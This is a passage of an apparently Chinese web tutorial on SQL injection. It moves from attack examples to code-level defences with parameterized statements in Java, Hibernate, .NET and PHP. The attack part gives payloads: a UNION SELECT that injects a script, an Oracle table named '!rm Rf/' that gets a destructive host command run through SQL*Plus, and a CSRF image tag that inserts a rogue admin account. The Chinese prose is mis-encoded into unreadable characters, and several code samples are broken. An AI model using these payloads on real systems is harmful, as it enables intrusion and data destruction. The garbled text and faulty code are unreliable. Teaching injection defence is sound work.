title="æ”»å‡»å®¢æˆ·ç«¯æ•°æ®åº“"></a>æ”»å‡»å®¢æˆ·ç«¯æ•°æ®åº“</h4><p>è¦å‘é€å®¢æˆ·ç«¯SQLæ³¨å…¥æ”»å‡»ï¼Œæ”»å‡»è€…å¿…é¡»è¯†åˆ«å‡ºä¸€äº›ä»–èƒ½æ§åˆ¶çš„æ•°æ®ç‰‡æ®µï¼Œå¹¶ä¸”åº”ç”¨ç¨‹åºä»¥éå®‰å…¨æ–¹å¼å°†è¿™äº›æ•°æ®ç‰‡æ®µå­˜å‚¨åœ¨å…¶ä»–ç”¨æˆ·çš„å®¢æˆ·ç«¯æ•°æ®åº“ä¸­ã€‚</p><p>å¦‚æœè¿™äº›å®¢æˆ·ç«¯æ•°æ®åº“å­˜åœ¨åŒæ­¥ï¼Œèƒ½åˆ°è¾¾å…¶ä»–æ•°æ®åº“æ‰§è¡Œï¼Œåˆ™å¯ä»¥æ³¨å…¥SQLæŸ¥è¯¢</p><p>åœºæ™¯</p><p>åœ¨ç¤¾äº¤ç½‘ç»œåº”ç”¨ç¨‹åºä¸­ï¼Œåœ¨Webé‚®ä»¶åº”ç”¨ç¨‹åºä¸­ï¼Œåœ¨å®ç°æ‹å–åŠŸèƒ½çš„åº”ç”¨ç¨‹åºä¸­ï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„åŸºäºæ–‡æœ¬çš„æ•°æ®ï¼Œåœ¨å±å¹•ä¸Šè¾“å…¥çš„ä½†æ˜¯å—åˆ°è¾“å…¥éªŒè¯ç¨‹åºæ”¯é…çš„æ•°æ®</p><h3 id="ä½¿ç”¨æ··åˆæ”»å‡»"><a href="#ä½¿ç”¨æ··åˆæ”»å‡»" class="headerlink" title="ä½¿ç”¨æ··åˆæ”»å‡»"></a>ä½¿ç”¨æ··åˆæ”»å‡»</h3><p>åˆ©ç”¨å¤šç§æ¼æ´æ··åˆæ”»å‡»</p><h4 id="åˆ©ç”¨æ•è·çš„æ•°æ®"><a href="#åˆ©ç”¨æ•è·çš„æ•°æ®" class="headerlink" title="åˆ©ç”¨æ•è·çš„æ•°æ®"></a>åˆ©ç”¨æ•è·çš„æ•°æ®</h4><p>åˆ©ç”¨SQLæ³¨å…¥è¯»å–æƒé™ï¼Œè´¦æˆ·ï¼Œå£ä»¤</p><h4 id="åˆ›å»ºè·¨ç«™è„šæœ¬"><a href="#åˆ›å»ºè·¨ç«™è„šæœ¬" class="headerlink" title="åˆ›å»ºè·¨ç«™è„šæœ¬"></a>åˆ›å»ºè·¨ç«™è„šæœ¬</h4><p>åœ¨SQLæ³¨å…¥ä¸èƒ½å›æ˜¾æ—¶ï¼Œå¯ä»¥æ³¨å…¥åå°„XSSæ¥è¿”å›è¾“å‡º</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">https:<span class="token comment">//www.example.org/MyOrders.php?orderType=123+UNION+SELECT+1,'&lt;script&gt;alert(1)&lt;/script&gt;',1</span><span class="token comment">#æµ‹è¯•xss,å¦‚æœæ²¡æœ‰è¿‡æ»¤å°±ä¼šæ‰§è¡ŒæˆåŠŸ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="åœ¨Oracleä¸Šè¿è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤"><a href="#åœ¨Oracleä¸Šè¿è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="åœ¨Oracleä¸Šè¿è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤"></a>åœ¨Oracleä¸Šè¿è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token string">"!rm Rf/"</span> <span class="token punctuation">(</span>a varchar2 <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#è¯¥å‘½ä»¤èƒ½è¢«Oracleæ¥å—</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¦‚æœDBAæˆ–å¼€å‘äººå‘˜ä½¿ç”¨å¸¦spoolå‘½ä»¤ï¼ˆDBAç¼–å†™åŠ¨æ€SQLè„šæœ¬æ—¶ç»å¸¸ä½¿ç”¨çš„æŠ€æœ¯ï¼‰çš„ SQL*Plusè„šæœ¬ï¼Œé‚£ä¹ˆSQL*Plusä¼šæ¸…é™¤ä¸Šè¿°ä¾‹å­ä¸­çš„åŒå¼•å·ä»¥ä¾¿è®¿é—®è¯¥å¯¹è±¡ã€‚æ¥ä¸‹æ¥SQL*Plus ä¼šå°†æ„Ÿå¹å·è§£ææˆä¸»æœºå‘½ä»¤ï¼ˆUNIXä¸­æ˜¯ï¼ï¼ŒWindowså’ŒVMSä¸­æ˜¯$ï¼‰ï¼Œå¹¶å°†æ„Ÿå¹å·åé¢çš„å†…å®¹ä½œä¸ºæ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ˜“å—æ”»å‡»çš„SQL*Plusè„šæœ¬çš„ä¾‹å­ã€‚å®ƒåˆ›å»ºäº†ä¸€ä¸ªåä¸ºtest.sqlçš„spoolæ–‡ä»¶ï¼Œ ä¹‹åæ‰§è¡Œè¯¥æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SPOOL test.sqlSELECT table_name FROM all_tables WHERE <span class="token assign-left variable">owner</span><span class="token operator">=</span><span class="token string">'SCOTT'</span><span class="token punctuation">;</span>SPOOL OFF@test.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åˆ©ç”¨éªŒè¯è¿‡çš„æ¼æ´"><a href="#åˆ©ç”¨éªŒè¯è¿‡çš„æ¼æ´" class="headerlink" title="åˆ©ç”¨éªŒè¯è¿‡çš„æ¼æ´"></a>åˆ©ç”¨éªŒè¯è¿‡çš„æ¼æ´</h4><p>å¦‚æœç®¡ç†å‘˜åœ¨åº”ç”¨ç¨‹åºä¸­å®Œå…¨å¯ä¿¡ï¼Œé‚£ä¹ˆä»–ä»¬å°†èƒ½å¤Ÿç›´æ¥åœ¨æ•°æ®åº“ä¸­æ‰§è¡Œä»»æ„SQLæŸ¥è¯¢ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">https:<span class="token comment">//www.example.org/admin/ViewUser.aspx?UID=123</span><span class="token comment">#è‹¥UIDæ˜¯ç®¡ç†å‘˜,å°±å¯ä»¥ç›´æ¥åˆ©ç”¨ç®¡ç†å‘˜æƒé™æ”»å‡»</span><span class="token comment">#æ„é€ è·¨ç«™ä¼ªé€ ,è¯±å¯¼ç®¡ç†å‘˜å¸®åŠ©æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">" https://www.example.org/admin/ViewUser.aspx?UID=123;+INSERT+INTO+USERS+(username,password,isAdmin)+VALUES+('pablo','quest45th', true)"</span><span class="token operator">&gt;</span><span class="token comment">#è‹¥ç®¡ç†å‘˜ç‚¹å‡»å›¾ç‰‡å°±ä¼šå¸®æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜ç”¨æˆ·,è¿™ä¸ªç”¨æˆ·æˆ‘ä»¬èƒ½æŒæ¡ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä»£ç å±‚é˜²å¾¡"><a href="#ä»£ç å±‚é˜²å¾¡" class="headerlink" title="ä»£ç å±‚é˜²å¾¡"></a>ä»£ç å±‚é˜²å¾¡</h2><h3 id="é¢†åŸŸé©±åŠ¨çš„å®‰å…¨"><a href="#é¢†åŸŸé©±åŠ¨çš„å®‰å…¨" class="headerlink" title="é¢†åŸŸé©±åŠ¨çš„å®‰å…¨"></a>é¢†åŸŸé©±åŠ¨çš„å®‰å…¨</h3><p>é¢†åŸŸé©±åŠ¨çš„å®‰å…¨(Domain Driven Security, DDS)æ˜¯ä¸€ç§è®¾è®¡ä»£ç çš„æ–¹æ³•ï¼Œä»¥è¿™ç§æ–¹æ³•è®¾è®¡çš„ä»£ç å¯ä»¥é¿å…å…¸å‹çš„æ³¨å…¥é—®é¢˜</p><p>é¢†åŸŸé©±åŠ¨çš„å®‰å…¨æ˜¯ä¸€ç§å¼€å‘æ–¹æ³•ï¼Œå®ƒçš„ç›®æ ‡æ˜¯å¸®åŠ©å¼€å‘äººå‘˜è¿›è¡Œæ¨ç†å¹¶ç¼“è§£ä»»ä½•ç±»å‹çš„æ³¨å…¥æ”»å‡»çš„å¨èƒâ€”â€”åŒ…æ‹¬SQLæ³¨å…¥å’Œè·¨ç«™è„šæœ¬æ”»å‡»ã€‚é¢†åŸŸé©±åŠ¨çš„å®‰å…¨æ˜¯å¼€å‘äººå‘˜ä¸ºå¼€å‘äººå‘˜åˆ›å»ºçš„ç†å¿µï¼Œå®ƒçš„çµæ„Ÿæ¥è‡ªäºEric Evansæå‡ºçš„é¢†åŸŸé©±åŠ¨è®¾è®¡ï¼Œå®ƒè¯•å›¾å……åˆ†åˆ©ç”¨æ¥è‡ªäºDDDçš„æ¦‚å¿µä»¥æé«˜åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ã€‚</p><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æŠŠæ‰€æœ‰è¿‡æ»¤ã€å¤„ç†çš„è¿‡ç¨‹å°è£…æˆä¸€ä¸ªç±»ï¼Œå°†è¿™ä¸ªå¤„ç†ç±»æ”¾åœ¨è¾“å‡ºåˆ°æœåŠ¡å™¨ä¹‹é—´ï¼Œè‡ªåŠ¨è¿‡æ»¤</p><p>å½“ç„¶ï¼Œè¿‡æ»¤ä¸èƒ½å®Œå…¨å¤„ç†ï¼Œä½¿ç”¨å‚æ•°åŒ–è¯­è¨€ä¹Ÿæ˜¯æ˜æ™ºé€‰æ‹©ï¼Œæœ‰æ—¶ç¼–ç ä¹Ÿèƒ½è§£å†³é—®é¢˜ï¼Œä½†æ˜¯è€ƒè™‘åˆ°ä¸åŒæ•°æ®åº“çš„å¤„ç†ä¸åŒï¼Œä¹Ÿä¼šè¡ç”Ÿç›¸åº”é—®é¢˜</p><h3 id="ä½¿ç”¨å‚æ•°åŒ–è¯­è¨€"><a href="#ä½¿ç”¨å‚æ•°åŒ–è¯­è¨€" class="headerlink" title="ä½¿ç”¨å‚æ•°åŒ–è¯­è¨€"></a>ä½¿ç”¨å‚æ•°åŒ–è¯­è¨€</h3><p>å¤§å¤šæ•°ç°ä»£ç¼–ç¨‹è¯­è¨€å’Œæ•°æ®åº“è®¿é—®APIå¯ä»¥ä½¿ç”¨å ä½ç¬¦æˆ–ç»‘å®šå˜é‡æ¥å‘SQLæŸ¥è¯¢æä¾›å‚æ•°(è€Œéç›´æ¥å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œæ“ä½œ)ã€‚é€šå¸¸ç§°ä¹‹ä¸ºå‚æ•°åŒ–è¯­å¥</p><p>è™½ç„¶å®ƒä»¬ä¸ä¼šä¿®æ”¹ä¼ é€’ç»™æ•°æ®åº“çš„å†…å®¹ï¼Œä½†å¦‚æœæ­£åœ¨è°ƒç”¨çš„æ•°æ®åº“åŠŸèƒ½åœ¨å­˜å‚¨è¿‡ç¨‹æˆ–å‡½æ•°çš„å®ç°ä¸­ä½¿ç”¨äº†åŠ¨æ€SQLï¼Œé‚£ä¹ˆä»ç„¶å¯èƒ½å‡ºç°SQLæ³¨å…¥ã€‚Microsoft SQL Serverå’ŒOracleé•¿æœŸå—è¯¥é—®é¢˜çš„å›°æ‰°ï¼Œå› ä¸ºå®ƒä»¬ä¹‹å‰é™„å¸¦å®‰è£…äº†å¾ˆå¤šå†…ç½®çš„æ˜“å—SQLæ³¨å…¥æ”»å‡»çš„å­˜å‚¨è¿‡ç¨‹ã€‚</p><p>äºŒæ¬¡æ³¨å…¥ä¹Ÿå¯èƒ½å®ç°</p><p>å¹¶ä¸æ˜¯æ‰€æœ‰çš„SQLè¯­å¥éƒ½å¯ä»¥å‚æ•°åŒ–ã€‚ç‰¹åˆ«æ˜¯åªèƒ½å‚æ•°åŒ–æ•°æ®å€¼ï¼Œè€Œä¸èƒ½å‚æ•°åŒ–SQLæ ‡è¯†ç¬¦æˆ–å…³é”®å­—ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Username <span class="token operator">=</span> request<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>Password <span class="token operator">=</span> request <span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token keyword">Sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username='"</span> <span class="token operator">+</span> Username <span class="token operator">+</span> <span class="token string">"'AND password='"</span><span class="token operator">+</span>Password <span class="token operator">+</span> <span class="token string">"'"</span>Result <span class="token operator">=</span> Db<span class="token punctuation">.</span><span class="token keyword">Execute</span><span class="token punctuation">(</span><span class="token keyword">Sql</span><span class="token punctuation">)</span><span class="token keyword">If</span> <span class="token punctuation">(</span>Result<span class="token punctuation">)</span> <span class="token comment">/* successful login */</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ˜¯ä¸€æ®µæ˜“å—æ”»å‡»ä»£ç ï¼Œä¸‹é¢å°†ä¼šå¯¹å®ƒå‚æ•°åŒ–</p><h4 id="Javaä¸­çš„å‚æ•°åŒ–è¯­å¥"><a href="#Javaä¸­çš„å‚æ•°åŒ–è¯­å¥" class="headerlink" title="Javaä¸­çš„å‚æ•°åŒ–è¯­å¥"></a>Javaä¸­çš„å‚æ•°åŒ–è¯­å¥</h4><p>Javaæä¾›äº†JDBCæ¡†æ¶(åœ¨java.sqlå’Œjavax.sqlå‘½åç©ºé—´ä¸­å®ç°)ï¼Œä½œä¸ºç‹¬ç«‹äºä¾›åº”å•†çš„æ•°æ®åº“è®¿é—®æ–¹æ³•ã€‚JDBCæ”¯æŒå¤šç§å¤šæ ·çš„æ•°æ®åº“è®¿é—®æ–¹æ³•ï¼ŒåŒ…æ‹¬é€šè¿‡PreparedStatementç±»æ¥ä½¿ç”¨å‚æ•°åŒ–è¯­å¥ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Connection</span> con <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>connectionstring<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username=? AND password=?"</span><span class="token punctuation">;</span> <span class="token class-name">PreparedStatement</span> lookupusers <span class="token operator">=</span> con<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†å‚æ•°æ·»åŠ åˆ°SQLæŸ¥è¯¢ä¸­</span>lookupUser<span class="token punctuation">.</span>setstring <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åœ¨ä½ç½®1æ·»åŠ å­—ç¬¦ä¸²</span>lookupUser<span class="token punctuation">.</span>setstring <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åœ¨ä½ç½®2æ·»åŠ å­—ç¬¦ä¸²</span>rs <span class="token operator">=</span> lookupUser<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ·»åŠ å‚æ•°æ—¶ï¼ˆé€šè¿‡ä½¿ç”¨ä¸åŒçš„ser&lt;type&gt;å‡½æ•°ï¼Œæ¯”å¦‚setStringï¼‰æŒ‡å®šäº†é—®å·(?)å ä½ç¬¦çš„ç¼–å·ä½ç½®ï¼ˆä»1å¼€å§‹ï¼‰</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨J2EEåº”ç”¨ä¸­ï¼Œé™¤äº†ä½¿ç”¨Javaæä¾›çš„JDBCæ¡†æ¶å¤–ï¼Œé€šå¸¸è¿˜å¯ä»¥ä½¿ç”¨é™„åŠ çš„åŒ…æ¥é«˜æ•ˆåœ°è®¿é—®æ•°æ®åº“ã€‚å¸¸ç”¨çš„è®¿é—®æ•°æ®åº“çš„æŒä¹…åŒ–æ¡†æ¶ä¸ºHibernateã€‚</p><p>é™¤äº†å¯ä»¥ä½¿ç”¨å›ºæœ‰çš„SQLåŠŸèƒ½å’Œå‰é¢ä»‹ç»çš„JDBCåŠŸèƒ½å¤–ï¼ŒHibernateè¿˜æä¾›äº†è‡ªå·±çš„åŠŸèƒ½æ¥å°†å˜é‡ç»‘å®šåˆ°å‚æ•°åŒ–è¯­å¥ã€‚Queryå¯¹è±¡æä¾›äº†ä½¿ç”¨å‘½åå‚æ•°(ä½¿ç”¨å†’å·æŒ‡å®šï¼Œparameter) æˆ–JDBCé£æ ¼çš„é—®å·å ä½ç¬¦(?)çš„æ–¹æ³•ã€‚</p><p>ä¸‹é¢çš„ä¾‹å­å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨å¸¦å‘½åå‚æ•°çš„Hibernateï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">string sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username=:username AND"</span> <span class="token operator">+</span> <span class="token string">"password=:password"</span><span class="token punctuation">;</span><span class="token class-name">Query</span> lookupUser <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">createQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†å‚æ•°æ·»åŠ åˆ°SQLæŸ¥è¯¢ä¸­</span>lookupUsers<span class="token punctuation">.</span><span class="token function">setstring</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ·»åŠ  username</span>lookupUsers<span class="token punctuation">.</span><span class="token function">setstring</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ·»åŠ  password</span><span class="token class-name">List</span> rs <span class="token operator">=</span> lookupUser<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥çš„ä¾‹å­å±•ç¤ºäº†å¦‚ä½•åœ¨Hibernateçš„å‚æ•°ä¸­ï¼Œä½¿ç”¨JDBCé£æ ¼çš„é—®å·å ä½ç¬¦ã€‚è¯·æ³¨æ„ï¼Œ Hibernateä»0å¼€å§‹è€Œä¸æ˜¯åƒJDBCé‚£æ ·ä»1å¼€å§‹å¯¹å‚æ•°è¿›è¡Œç¼–å·ã€‚å› æ­¤ï¼Œåˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸º0ï¼Œç¬¬äºŒä¸ªä¸º1</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">string sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username=? AND password=?"</span><span class="token punctuation">;</span><span class="token class-name">Query</span> lookupUser <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">createQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†å‚æ•°æ·»åŠ åˆ°SQLæŸ¥è¯¢ä¸­</span>lookupUser<span class="token punctuation">.</span><span class="token function">setstring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//æ·»åŠ username</span>lookupUser<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//æ·»åŠ password</span><span class="token class-name">List</span> rs <span class="token operator">=</span> lookupUser<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="NET-C-ä¸­çš„å‚æ•°åŒ–è¯­å¥"><a href="#NET-C-ä¸­çš„å‚æ•°åŒ–è¯­å¥" class="headerlink" title=".NET(C#)ä¸­çš„å‚æ•°åŒ–è¯­å¥"></a>.NET(C#)ä¸­çš„å‚æ•°åŒ–è¯­å¥</h4><p>Microsoft .NETæä¾›äº†å¾ˆå¤šä¸åŒçš„è®¿é—®æ–¹å¼ï¼Œå®ƒä»¬ä½¿ç”¨ADO.NETæ¡†æ¶æ¥å‚æ•°åŒ–è¯­å¥ã€‚ADO.NETè¿˜æä¾›äº†é™„åŠ çš„åŠŸèƒ½ï¼Œå¯ä»¥è¿›ä¸€æ­¥æ£€æŸ¥æä¾›çš„å‚æ•°ï¼Œæ¯”å¦‚å¯¹æäº¤çš„æ•°æ®æ‰§è¡Œç±»å‹æ£€æŸ¥ç­‰ã€‚</p><p>æ ¹æ®è®¿é—®çš„æ•°æ®åº“ç±»å‹çš„ä¸åŒï¼ŒADO.NETæä¾›äº†4ç§ä¸åŒçš„æ•°æ®æä¾›ç¨‹åº:ç”¨äºMicrosoft SQL Server çš„ System.Data.SqlClientï¼Œç”¨äº Oracle æ•°æ®åº“çš„ System.Data.OracleClient,ä»¥åŠåˆ†åˆ«ç”¨ äºOLE DBå’ŒODBCæ•°æ®æºçš„System.Data.OleDbå’ŒSystem.Data.Odbc</p><p>ADO.NETæ•°æ®æä¾›ç¨‹åºä»¥åŠå‚æ•°å‘½åè¯­æ³•</p><table><thead><tr><th>æ•°æ®æä¾›ç¨‹åº</th><th>å‚æ•°è¯­æ³•</th></tr></thead><tbody><tr><td>System.Data.SqlClient</td><td>@parameter</td></tr><tr><td>System.Data.OracleClient</td><td>:parameter(åªèƒ½ä½äºå‚æ•°åŒ–çš„SQLå‘½ä»¤æ–‡æœ¬ä¸­)</td></tr><tr><td>System.Data.OleDb</td><td>å¸¦é—®å·å ä½ç¬¦(?)çš„ä½ç½®å‚æ•°</td></tr><tr><td>System.Data.Odbc</td><td>å¸¦é—®å·å ä½ç¬¦(?)çš„ä½ç½®å‚æ•°</td></tr></tbody></table><p>ä½¿ç”¨SqlClientæ•°æ®æä¾›ç¨‹åºå°†å…¶é‡å†™ä¸º.NETæ ¼å¼çš„å‚æ•°åŒ–è¯­å¥</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">SqlConnection con = new SqlConnection(Connectionstring);string Sql = "SELECT * FROM users WHERE username=@username" + "AND password=@password";cmd = new SqlCommand(Sql, con); //å°†å‚æ•°æ·»åŠ åˆ°SQLæŸ¥è¯¢ä¸­cmd.Parameters.Add("@username",//å‚æ•°å                   SqlDbType.NVarChar,//æ•°æ®ç±»å‹                   16);//é•¿åº¦cmd.Parameters.Add("@password",                   SqlDbType.NVarChar,                   16);cmd.Parameters.Value["@username"]=username;//è®¾ç½®å‚æ•°cmd.Parameters.Value["@password"]=password;//æä¾›å‚æ•°å€¼reader = cmd.ExecuteReader();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨OracleClientæ•°æ®æä¾›ç¨‹åºé‡å†™çš„åŒä¸€.NETæ ¼å¼çš„å‚æ•°åŒ–è¯­å¥ã€‚ åœ¨å‘½ä»¤æ–‡æœ¬ï¼ˆSQLå­—ç¬¦ä¸²ï¼‰ä¸­çš„å‚æ•°å‰é¢æ·»åŠ äº†å†’å·ï¼Œè€Œä¸æ˜¯åœ¨ä»£ç çš„å…¶ä»–ä½ç½®</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">SqlConnection con = new SqlConnection(Connectionstring);string Sql = "SELECT * FROM users WHERE username=:username" + "AND password=:password";cmd = new SqlCommand(Sql, con); //å°†å‚æ•°æ·»åŠ åˆ°SQLæŸ¥è¯¢ä¸­cmd.Parameters.Add("username",//å‚æ•°å                   SqlDbType.NVarChar,//æ•°æ®ç±»å‹                   16);//é•¿åº¦cmd.Parameters.Add("password",                   SqlDbType.NVarChar,                   16);cmd.Parameters.Value["username"]=username;//è®¾ç½®å‚æ•°cmd.Parameters.Value["password"]=password;//æä¾›å‚æ•°å€¼reader = cmd.ExecuteReader();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨OleDbClientæ•°æ®æä¾›ç¨‹åºé‡å†™çš„åŒä¸€.NETæ ¼å¼çš„å‚æ•°åŒ–è¯­å¥ã€‚ ä½¿ç”¨OleDbClientæˆ–OleDbæ•°æ®æä¾›ç¨‹åºæ—¶ï¼Œå¿…é¡»æŒ‰ç…§æ­£ç¡®çš„é—®å·å ä½ç¬¦é¡ºåºæ¥æ·»åŠ å‚æ•°</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">SqlConnection con = new SqlConnection(Connectionstring);string Sql = "SELECT * FROM users WHERE username=? + "AND password=?";cmd = new SqlCommand(Sql, con); //å°†å‚æ•°æ·»åŠ åˆ°SQLæŸ¥è¯¢ä¸­cmd.Parameters.Add("@username",//å‚æ•°å                   SqlDbType.NVarChar,//æ•°æ®ç±»å‹                   16);//é•¿åº¦cmd.Parameters.Add("@password",                   SqlDbType.NVarChar,                   16);cmd.Parameters.Value["@username"]=username;//è®¾ç½®å‚æ•°cmd.Parameters.Value["@password"]=password;//æä¾›å‚æ•°å€¼reader = cmd.ExecuteReader();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="PHPä¸­çš„å‚æ•°åŒ–è¯­å¥"><a href="#PHPä¸­çš„å‚æ•°åŒ–è¯­å¥" class="headerlink" title="PHPä¸­çš„å‚æ•°åŒ–è¯­å¥"></a>PHPä¸­çš„å‚æ•°åŒ–è¯­å¥</h4><p>PHPåŒæ ·åŒ…å«å¾ˆå¤šç”¨äºè®¿é—®æ•°æ®åº“çš„æ¡†æ¶ã€‚æœ¬èŠ‚ä»‹ç»ä¸‰ç§æœ€å¸¸è§çš„æ¡†æ¶ï¼šè®¿é—®MySQLæ•°æ®åº“çš„mysqliåŒ…ï¼ŒPEAR::MDB2åŒ…ï¼ˆå®ƒæ›¿ä»£äº†æµè¡Œçš„PEAR::DBåŒ…ï¼‰ä»¥åŠæ–°çš„PHPæ•°æ®å¯¹è±¡ï¼ˆPHP Data Object, PDO)æ¡†æ¶ï¼Œå®ƒä»¬å‡ä¸ºä½¿ç”¨å‚æ•°åŒ–è¯­å¥æä¾›äº†ä¾¿åˆ©ã€‚</p><p>mysqliåŒ…é€‚ç”¨äºPHP 5.xï¼Œå¯ä»¥è®¿é—®MySQL 4.1åŠä¹‹åçš„ç‰ˆæœ¬ã€‚é€šè¿‡ä½¿ç”¨é—®å·å ä½ç¬¦æ¥æ”¯æŒå‚æ•°åŒ–è¯­å¥ã€‚ä¸‹é¢çš„ä¾‹å­å±•ç¤ºäº†ä¸€æ¡ä½¿ç”¨mysqliåŒ…çš„å‚æ•°åŒ–è¯­å¥</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"username"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"password"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username=? AND password=?"</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$con</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†å‚æ•°æ·»åŠ åˆ°SQLæŸ¥è¯¢ä¸­</span><span class="token variable">$cmd</span><span class="token operator">-&gt;</span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//å°†å‚æ•°ä½œä¸ºå­—ç¬¦ä¸²ç»‘å®š</span><span class="token variable">$cmd</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" 